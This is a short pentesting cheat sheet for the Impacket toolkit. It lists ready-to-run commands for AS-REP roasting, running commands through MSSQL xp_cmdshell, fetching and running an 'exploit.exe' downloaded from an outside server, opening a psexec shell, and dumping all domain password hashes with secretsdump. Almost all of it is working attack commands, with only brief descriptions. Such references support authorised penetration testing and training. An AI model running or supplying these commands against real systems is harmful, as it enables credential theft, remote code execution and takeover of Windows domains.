---
title: Impacket
desc: Provides low level access to the packets. It also used to connect Microsoft SQL.
tags: [ActiveDirectory, ActiveRecon, MSSQL, Windows]
alts: [Bloodhound, Kerbrute, Mimikatz]
website:
render_with_liquid: false
---

```sh
impacket-netview -h
```

<br />

## impacket-GetNPUsers

Lists users and passwords is not required Kerberos pre auth. Used for ASREPRoasting.

```sh
# Get password (e.g. domain: 'example.local', username: 'admin')
impacket-GetNPUsers -dc-ip 10.0.0.1 -format hashcat example.local/admin
```

<br />

## impacket-mssqlclient

Establish an authenticated connection to Microsoft SQL.

```sh
impacket-mssqlclient -port 1433 DOMAIN/username:password@10.0.0.1 -windows-auth

# ------ Logged in ---------------------------------------------

SQL> enable_xp_cmdshell
SQL> disable_xp_cmdshell

# Execute commands
SQL> xp_cmdshell whoami
SQL> xp_cmdshell dir
SQL> xp_cmdshell .\exploit.exe
SQL> xp_cmdshell "powershell.exe pwd"
# Get files from external server
SQL> xp_cmdshell "powershell.exe wget -UseBasicParsing http://10.0.0.1:8000/exploit.exe -OutFile c:\\Users\Public\exploit.exe"
```

<br />

## impacket-psexec

Interactive shell on Windows host.

```sh
impacket-psexec username:password@10.0.0.1
```

<br />

## impacket-rpcdump

```sh
impacket-rpcdump -port 135 10.0.0.1
```

<br />

## impacket-secretsdump

Gets all password hashes.

```sh
# Basic
impacket-secretsdump example.local/username:password@10.0.0.1

# Only NTLM hashes and Kerberos keys
impacket-secretsdump -just-dc example.local/username:password@10.0.0.1

# Only NTLM hashes
impacket-secretsdump -just-dc-ntlm example.local/username:password@10.0.0.1
```